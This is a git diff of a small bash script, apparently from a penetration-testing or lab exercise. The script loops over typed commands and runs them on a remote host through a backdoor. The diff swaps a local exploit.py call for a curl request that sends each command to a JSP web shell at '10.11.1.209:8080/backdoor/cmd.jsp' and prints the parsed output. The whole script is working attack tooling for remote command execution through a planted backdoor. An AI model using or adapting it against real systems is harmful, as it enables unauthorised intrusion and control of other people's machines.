@@ -1,4 +1,4 @@
-#!/bin/env bash
+#!/usr/bin/env bash
 
 :<<!
 auth: @cyhfvg https://github.com/cyhfvg
@@ -15,8 +15,10 @@ do
     printf "\033[32m${cmd}\033[0m\n";
 
     # FIXME: change to correct command
-    content=$(python3 ./exploit.py "${cmd} 2>&1" | sed -e '1d')
-    printf "\033[33m${content}\033[0m\n";
+    # urlencode get param
+    content=$(curl -s --data-urlencode cmd="${cmd}" "http://10.11.1.209:8080/backdoor/cmd.jsp" | sed -ne '/<pre>/,/<\/pre>/p' | sed -e '1d;$d')
+
+    printf "\033[33m%s\033[0m\n" "${content}"
 
     echo -n ">"
 done
